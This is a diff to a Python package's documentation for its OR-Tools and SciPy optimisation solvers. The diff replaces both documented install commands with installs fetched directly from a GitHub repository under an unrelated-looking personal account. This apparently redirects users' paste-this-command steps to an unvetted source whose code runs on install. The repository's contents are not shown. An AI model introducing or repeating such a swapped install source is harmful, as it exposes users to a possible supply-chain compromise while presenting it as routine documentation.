@@ -15,7 +15,7 @@ Capability label: ``implemented``.
     f = solve_max_flow([{"from": "s", "to": "t", "capacity": 3}], "s", "t")
     f.objective, f.solution["min_cut"]                       # (3.0, ["s"])
 
-What it does, in process on OR-Tools (``pip install 'g6[optim]'``; imported only when an op runs):
+What it does, in process on OR-Tools (``pip install 'g6[optim] @ git+https://github.com/basicisabc1994/g6solver'``; imported only when an op runs):
 
 * ``solve_lp``, a linear programme on GLOP and ``solve_mip``, a mixed-integer one on SCIP, both through MathOpt;
   ``solve_cp``, a constraint model on CP-SAT (integer variables, linear constraints, all-different groups, an
@@ -26,7 +26,7 @@ What it does, in process on OR-Tools (``pip install 'g6[optim]'``; imported only
   ``solve_min_cost_flow`` on ``ortools.graph``; ``solve_routing`` on the routing library, with optional capacities and
   time windows.
 
-And on SciPy (``pip install 'g6[optim-nonlinear]'``), for a non-linear objective over a box (merged from the archive's
+And on SciPy (``pip install 'g6[optim-nonlinear] @ git+https://github.com/basicisabc1994/g6solver'``), for a non-linear objective over a box (merged from the archive's
 ``adapt_optimisation`` and ``adapt_pygad``; :mod:`g6.optimisation.nonlinear`):
 
 * ``minimise``, a local method (L-BFGS-B, Nelder-Mead or Powell) from several starts, its answer called a local
